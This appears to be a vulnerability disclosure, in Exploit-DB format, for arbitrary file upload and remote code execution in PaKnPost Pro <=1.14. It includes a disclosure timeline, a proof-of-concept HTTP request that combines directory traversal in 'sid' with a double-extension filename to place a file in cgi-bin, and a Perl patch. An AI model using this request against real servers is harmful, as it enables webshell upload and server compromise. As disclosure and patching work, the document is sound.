@@ -1,0 +1,91 @@
+# Exploit Title: PaKnPost Pro Arbitrary File Upload & Remote Code Execution
+# Date: 2016-07-06
+# Product: PaKnPost Pro
+# Vendor Homepage: http://www.paknpost.org
+# Software Link: https://sourceforge.net/projects/paknpost/
+# Version: <=1.14
+# Tested on: Windows, Linux
+# Exploit Authors: Edvin Rustemagic, Grega Preseren
+# Contacts: https://www.linkedin.com/in/edvinrustemagic - https://si.linkedin.com/in/gregapreseren
+
+===========
+Description
+===========
+File extension check bypass and directory traversal lead to uploading an arbitrary file to an unintended directory and remote code execution.
+
+=======
+Details
+=======
+File extension check can be bypassed by using two extensions, out of which one must be allowed (select_.cgi:368). 
+Directory traversal vulnerability exists in the GET parameter sid, where no validation checks are made (select_.cgi:204). 
+Exploitation of these two vulnerabilities allows an attacker to upload a webshell to an executable directory and gain command line access to the server. Windows deployments turned out to be more likely exploitable with a consequence of gaining SYSTEM privileges.
+
+========
+Timeline
+========
+2016-03-15 Vulnerability discovered at customer's deployment.
+2016-06-13 PoC completed for Linux and Windows platforms.
+2016-06-13 Author/Maintainer at SourceForge has been notified.
+2016-06-21 Patch written and delivered to Author/Maintainer.
+2016-06-23 Patch publicly released.
+2016-07-06 Exploit submitted to Exploit-DB.
+
+=======================
+Windows PoC Environment
+=======================
+- Windows Server 2003 R2 SP2
+- Apache 2.2.10
+- ActivePerl 5.8.0.806
+
+=====================
+Linux PoC Environment
+=====================
+- Debian 8.3
+- Apache 2.4.10
+- Perl 5.20.2
+
+=======
+Exploit
+=======
+1. File upload GET parameter 'sid' can be exploited in order to upload an arbitrary file to an unintended executable directory.
+2. File upload multipart POST parameter 'filename' can include two extensions to bypass file extension check.
+For example:
+POST /cgi-bin/pnp/select_.cgi?sid=../../../cgi-bin/ HTTP/1.1
+Host: paknpost
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://paknpost/cgi-bin/pnp/select.cgi
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------6077763223847
+Content-Length: 6087
+
+-----------------------------6077763223847
+Content-Disposition: form-data; name="file[1]"; filename="pnp-test.txt.cgi"
+Content-Type: application/octet-stream
+
+==============
+Solution/Patch
+==============
+a. Update to version 1.15
+b. Or apply the following patch:
+--- select_.cgi.ORIG    2016-03-29 22:56:40.868000000 +0200
++++ select_.cgi 2016-06-14 10:18:37.864000000 +0200
+@@ -201,6 +201,9 @@
+ }
+
+ # Create the new Holding Area
++if ($sessionid =~ m/[^\w]/) {
++  &error(file_write);
++}
+ $user_dir = $upload_dir.$sessionid;
+ if (-d "$user_dir")
+ {
+@@ -365,7 +368,7 @@
+          if ($file_check)
+          {
+            # Exclude all except acceptable file extensions as a fist cut to file checks
+-           unless (grep($fhl =~ /$_/, @allowed_ext)) { $debug1 = "Failed"; &show_file_not_allowed; }
++           unless (grep($fhl =~ /$_$/, @allowed_ext)) { $debug1 = "Failed"; &show_file_not_allowed; }
+            $debug1 = "Passed";
